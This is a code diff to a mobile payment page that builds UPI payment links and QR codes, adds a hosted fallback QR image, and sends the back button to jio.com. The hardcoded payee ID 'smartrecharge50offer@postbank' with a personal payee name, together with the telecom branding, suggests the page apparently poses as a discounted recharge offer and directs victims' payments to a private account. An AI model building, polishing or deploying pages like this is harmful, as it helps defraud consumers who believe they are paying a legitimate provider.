@@ -197,6 +197,16 @@
             margin: 15px auto;
             border: 1px solid #eee;
             border-radius: 8px;
+            max-width: 100%;
+        }
+        #qrCodeImage {
+            display: none;
+            margin: 15px auto;
+            border: 1px solid #eee;
+            border-radius: 8px;
+            max-width: 100%;
+            height: 200px;
+            width: 200px;
         }
         #qrCodeSection p {
             font-size: 15px;
@@ -214,6 +224,7 @@
             text-align: center;
             padding: 20px;
             color: #666;
+            display: none;
         }
     </style>
 </head>
@@ -293,9 +304,9 @@
 
     <div id="qrCodeSection">
         <p>Scan this QR code with any UPI app</p>
-        <div id="qrCodeContainer">
-            <canvas id="qrCodeCanvas"></canvas>
-        </div>
+        <div class="loading" id="qrLoading">Generating QR Code...</div>
+        <canvas id="qrCodeCanvas"></canvas>
+        <img id="qrCodeImage" src="https://i.ibb.co/4wk79ssC/IMG-20251020-003355.png" alt="QR Code">
         <span class="qr-info-display" id="qrUpiIdDisplay">UPI ID: smartrecharge50offer@postbank</span>
         <span class="qr-info-display" id="qrAmountDisplay">Amount: ₹0.00</span>
     </div>
@@ -330,22 +341,24 @@
             document.getElementById('qrAmountDisplay').textContent = `Amount: ₹${currentAmount}`;
             document.getElementById('qrUpiIdDisplay').textContent = `UPI ID: ${upiId}`;
 
-            // Generate UPI links with dynamic data
+            // Generate proper UPI links with correct format
             function generateUpiLink(scheme) {
                 const encodedRemark = encodeURIComponent(currentRemark);
                 const encodedName = encodeURIComponent("JAMENA SEKH");
-                const base = `pa=${upiId}&pn=${encodedName}&tn=${encodedRemark}&am=${currentAmount}&cu=INR`;
+                
+                // Standard UPI parameters
+                const baseParams = `pa=${upiId}&pn=${encodedName}&am=${currentAmount}&cu=INR&tn=${encodedRemark}`;
                 
                 switch(scheme) {
                     case 'phonepe':
-                        return `phonepe://pay?${base}`;
+                        return `phonepe://pay?${baseParams}`;
                     case 'paytm':
-                        return `paytmmp://pay?${base}`;
+                        return `paytmmp://pay?${baseParams}`;
                     case 'tez':
-                        return `tez://upi/pay?${base}`;
+                        return `tez://upi/pay?${baseParams}`;
                     case 'upi':
                     default:
-                        return `upi://pay?${base}`;
+                        return `upi://pay?${baseParams}`;
                 }
             }
 
@@ -359,27 +372,48 @@
             // Event Listeners for direct app options
             document.getElementById('phonepe-option').addEventListener('click', function(e) {
                 e.preventDefault();
+                console.log('Opening PhonePe:', links.phonepe);
                 window.location.href = links.phonepe;
+                
+                // Fallback if app not installed
+                setTimeout(function() {
+                    window.location.href = links.allUpi;
+                }, 500);
             });
 
             document.getElementById('paytm-option').addEventListener('click', function(e) {
                 e.preventDefault();
+                console.log('Opening Paytm:', links.paytm);
                 window.location.href = links.paytm;
+                
+                // Fallback if app not installed
+                setTimeout(function() {
+                    window.location.href = links.allUpi;
+                }, 500);
             });
 
             document.getElementById('googlepay-option').addEventListener('click', function(e) {
                 e.preventDefault();
+                console.log('Opening Google Pay:', links.googlepay);
                 window.location.href = links.googlepay;
+                
+                // Fallback if app not installed
+                setTimeout(function() {
+                    window.location.href = links.allUpi;
+                }, 500);
             });
 
             document.getElementById('other-upi-apps-option').addEventListener('click', function(e) {
                 e.preventDefault();
+                console.log('Opening Generic UPI:', links.allUpi);
                 window.location.href = links.allUpi;
             });
 
             // QR Code generation and display
             const qrCodeSection = document.getElementById('qrCodeSection');
             const qrCodeCanvas = document.getElementById('qrCodeCanvas');
+            const qrCodeImage = document.getElementById('qrCodeImage');
+            const qrLoading = document.getElementById('qrLoading');
             let qrCodeGenerated = false;
 
             document.getElementById('qr-code-option').addEventListener('click', function(e) {
@@ -395,22 +429,23 @@
             });
 
             function generateQRCode() {
+                qrLoading.style.display = 'block';
+                qrCodeCanvas.style.display = 'none';
+                qrCodeImage.style.display = 'none';
+
                 try {
-                    // Use UPI QR standard format for better compatibility
-                    const upiQrData = `upi://pay?pa=${upiId}&pn=${encodeURIComponent("JAMENA SEKH")}&am=${currentAmount}&cu=INR&tn=${encodeURIComponent(currentRemark)}`;
-                    
-                    // Clear previous QR code
-                    const ctx = qrCodeCanvas.getContext('2d');
-                    ctx.clearRect(0, 0, qrCodeCanvas.width, qrCodeCanvas.height);
-                    
-                    // Set canvas size
+                    // Set canvas size first
                     qrCodeCanvas.width = 200;
                     qrCodeCanvas.height = 200;
+
+                    // Create UPI QR code string in standard format
+                    const upiString = `upi://pay?pa=${upiId}&pn=${encodeURIComponent("JAMENA SEKH")}&am=${currentAmount}&tn=${encodeURIComponent(currentRemark)}&cu=INR`;
                     
-                    // Generate QR code
-                    QRCode.toCanvas(qrCodeCanvas, upiQrData, {
+                    console.log('Generating QR for:', upiString);
+
+                    // Generate QR code using the library
+                    QRCode.toCanvas(qrCodeCanvas, upiString, {
                         width: 200,
-                        height: 200,
                         margin: 1,
                         color: {
                             dark: '#000000',
@@ -418,30 +453,44 @@
                         },
                         errorCorrectionLevel: 'M'
                     }, function(error) {
+                        qrLoading.style.display = 'none';
+                        
                         if (error) {
-                            console.error('QR Code generation error:', error);
-                            alert('QR Code generation failed. Please try again.');
+                            console.error('QR Code generation failed:', error);
+                            // Show fallback image if QR generation fails
+                            qrCodeCanvas.style.display = 'none';
+                            qrCodeImage.style.display = 'block';
+                            console.log('Using fallback QR image');
                         } else {
-                            console.log('QR Code generated successfully!');
+                            console.log('QR Code generated successfully');
+                            qrCodeCanvas.style.display = 'block';
+                            qrCodeImage.style.display = 'none';
                             qrCodeGenerated = true;
                         }
                     });
+
                 } catch (error) {
                     console.error('Error in QR code generation:', error);
-                    alert('Error generating QR code. Please try again.');
+                    qrLoading.style.display = 'none';
+                    qrCodeCanvas.style.display = 'none';
+                    qrCodeImage.style.display = 'block';
                 }
             }
 
-            // Initialize QR code on page load (hidden)
+            // Initialize QR code on page load (but keep hidden)
             setTimeout(() => {
                 if (!qrCodeGenerated) {
                     generateQRCode();
                 }
-            }, 100);
+            }, 1000);
 
             // Back icon functionality
             document.querySelector('.menu-icon').addEventListener('click', function() {
-                alert('server error!');
+                if (document.referrer) {
+                    window.history.back();
+                } else {
+                    window.location.href = 'https://www.jio.com';
+                }
             });
         });
     </script>
